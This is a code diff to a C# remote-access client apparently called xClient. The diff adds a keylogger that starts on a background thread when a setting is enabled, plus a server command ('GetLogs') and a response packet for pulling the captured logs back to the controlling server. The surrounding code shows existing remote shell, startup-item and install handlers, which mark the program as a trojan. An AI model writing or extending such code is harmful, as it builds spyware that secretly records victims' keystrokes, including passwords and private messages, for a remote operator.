@@ -73,6 +73,7 @@ namespace xClient
                 typeof (Core.Packets.ServerPackets.GetStartupItems),
                 typeof (Core.Packets.ServerPackets.AddStartupItem),
                 typeof (Core.Packets.ServerPackets.DownloadFileCanceled),
+                typeof (Core.Packets.ServerPackets.GetLogs),
                 typeof (Core.Packets.ClientPackets.Initialize),
                 typeof (Core.Packets.ClientPackets.Status),
                 typeof (Core.Packets.ClientPackets.UserStatus),
@@ -84,7 +85,8 @@ namespace xClient
                 typeof (Core.Packets.ClientPackets.GetSystemInfoResponse),
                 typeof (Core.Packets.ClientPackets.MonitorsResponse),
                 typeof (Core.Packets.ClientPackets.ShellCommandResponse),
-                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse)
+                typeof (Core.Packets.ClientPackets.GetStartupItemsResponse),
+                typeof (Core.Packets.ClientPackets.GetLogsResponse)
             });
 
             ConnectClient.ClientState += ClientState;
@@ -131,6 +133,16 @@ namespace xClient
                     return;
 
                 SystemCore.Install();
+            }
+
+            if (Settings.ENABLELOGGER)
+            {
+                new Thread(() =>
+                {
+                    Logger logger = new Logger(30000);
+
+                    logger.Enabled = true;
+                }).Start();
             }
         }
 
@@ -291,6 +303,10 @@ namespace xClient
             {
                 CommandHandler.HandleDownloadFileCanceled((Core.Packets.ServerPackets.DownloadFileCanceled) packet,
                     client);
+            }
+            else if (type == typeof(Core.Packets.ServerPackets.GetLogs))
+            {
+                CommandHandler.HandleGetLogs((Core.Packets.ServerPackets.GetLogs) packet, client);
             }
         }
     }
